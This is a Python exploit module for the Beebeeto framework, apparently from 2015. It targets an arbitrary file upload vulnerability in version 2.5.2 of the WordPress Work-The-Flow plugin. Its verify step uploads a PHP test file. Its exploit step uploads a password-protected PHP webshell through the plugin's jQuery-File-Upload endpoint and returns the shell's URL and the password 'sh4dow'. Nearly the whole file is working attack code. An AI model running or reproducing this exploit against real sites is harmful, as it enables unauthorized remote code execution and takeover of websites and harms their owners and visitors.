#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame

from utils.payload.webshell import PhpVerify
from utils.payload.webshell import PhpShell


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0098',
            'name': 'Wordpress Work-The-Flow Plugin 2.5.2 文件上传漏洞 POC & Exploit',
            'author': 'sh4dow',
            'create_date': '2015-05-10',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress',
            'vul_version': ['2.5.2'],
            'type': 'File Upload',
            'tag': ['WordPress 插件漏洞', 'work-the-flow', 'file-upload', 'php'],
            'desc': '''
                    This module exploits an arbitrary PHP code upload in the WordPress Work The Flow plugin,
                    version 2.5.2.
                    The vulnerability allows for arbitrary file upload and remote code execution.
                    ''',
            'references': ['http://1337day.com/exploit/23540',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        php = PhpVerify().get_content()
        ver_url = '%s/wordpress/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php' % url
        path_url = '%s/wordpress/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/info.php' % url
        if args['options']['verbose']:
            print '[*] Request url: ' + ver_url
            print '[*] Upload file: ' + php
        payload = {'files': ('info.php', php, 'application/octet-stream'), 'action': 'upload'}
        requests.post(ver_url, files=payload)
        r = requests.get(path_url)
        if '202cb962ac59075b964b07152d234b70' in r.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = ver_url
        return args

    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        vul_url = '%s/wordpress/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php' % url
        php = PhpShell(pwd='sh4dow').get_content()
        if args['options']['verbose']:
            print '[*] Request url:' + vul_url
            print '[*] Upload file:' + php
        payload = {'files': ('info.php', php, 'application/octet-stream'), 'action': 'upload'}
        requests.post(vul_url, files=payload)
        file_path = '%s/wordpress/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/info.php' % url
        if args['options']['verbose']:
            print '[*] checking......'
        r = requests.get(file_path)
        if '202cb962ac59075b964b07152d234b70' in r.content:
            args['success'] = True
            args['poc_ret']['webshell'] = file_path
            args['poc_ret']['password'] = 'sh4dow'
        return args

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())